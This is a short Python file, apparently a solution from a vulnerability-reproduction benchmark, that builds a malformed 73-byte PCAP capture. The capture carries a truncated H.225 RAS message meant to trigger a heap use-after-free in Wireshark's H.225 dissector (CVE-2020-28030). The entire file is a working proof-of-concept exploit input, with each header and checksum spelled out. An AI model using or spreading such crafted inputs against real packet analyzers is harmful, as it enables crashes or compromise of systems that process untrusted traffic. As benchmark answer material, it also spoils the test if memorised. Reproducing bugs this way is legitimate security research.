import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a 73-byte PCAP file triggering H.225 Heap Use-After-Free (CVE-2020-28030 / arvo:5921)
        # The vulnerability involves next_tvb_add_handle in the H.225 dissector.
        # We use a raw IPv4 PCAP (LinkType 101) containing a UDP packet to port 1719 (RAS).
        
        # 1. Global Header (24 bytes)
        # Magic (a1b2c3d4), Version 2.4, Zone 0, Sig 0, Snaplen 65535, LinkType 101 (DLT_RAW)
        global_hdr = struct.pack('<IHHIIII', 0xa1b2c3d4, 2, 4, 0, 0, 65535, 101)
        
        # 2. IP Header (20 bytes)
        # IPv4, IHL 5, Total Len 33 (20 IP + 8 UDP + 5 Payload)
        ip_hdr = bytearray([
            0x45, 0x00, 0x00, 0x21,  # Ver/IHL, TOS, Len
            0x00, 0x01, 0x00, 0x00,  # ID, Flags
            0x40, 0x11, 0x00, 0x00,  # TTL, Proto (UDP), Checksum (0 placeholder)
            0x7f, 0x00, 0x00, 0x01,  # Src
            0x7f, 0x00, 0x00, 0x01   # Dst
        ])
        
        # Calculate IP Checksum
        s = 0
        for i in range(0, len(ip_hdr), 2):
            w = (ip_hdr[i] << 8) + (ip_hdr[i+1])
            s += w
        s = (s >> 16) + (s & 0xffff)
        s += (s >> 16)
        cs = ~s & 0xffff
        ip_hdr[10] = (cs >> 8) & 0xff
        ip_hdr[11] = cs & 0xff
        
        # 3. UDP Header (8 bytes)
        # Src Port 1234, Dst Port 1719 (H.225 RAS), Length 13, Checksum 0
        udp_hdr = struct.pack('!HHHH', 1234, 1719, 13, 0)
        
        # 4. Payload (5 bytes)
        # H.225 RAS Message: RequestInProgress (Choice 19)
        # Choice 19 (0x26): 0 (Ext) | 010011 (19) | 0 (SeqExt) -> 00100110
        # Header (0x40): 0 (Ext) | 1 (NonStdData Present) | 00000 (Other opts) | 0 (Pad)
        # SeqNum (0x0001): 2 bytes
        # Byte 4 (0x00): Truncated (start of next field)
        payload = b'\x26\x40\x00\x01\x00'
        
        packet_data = ip_hdr + udp_hdr + payload
        
        # 5. Packet Header (16 bytes)
        # Timestamp 0, Incl Len 33, Orig Len 33
        pkt_hdr = struct.pack('<IIII', 0, 0, len(packet_data), len(packet_data))
        
        return global_hdr + pkt_hdr + packet_data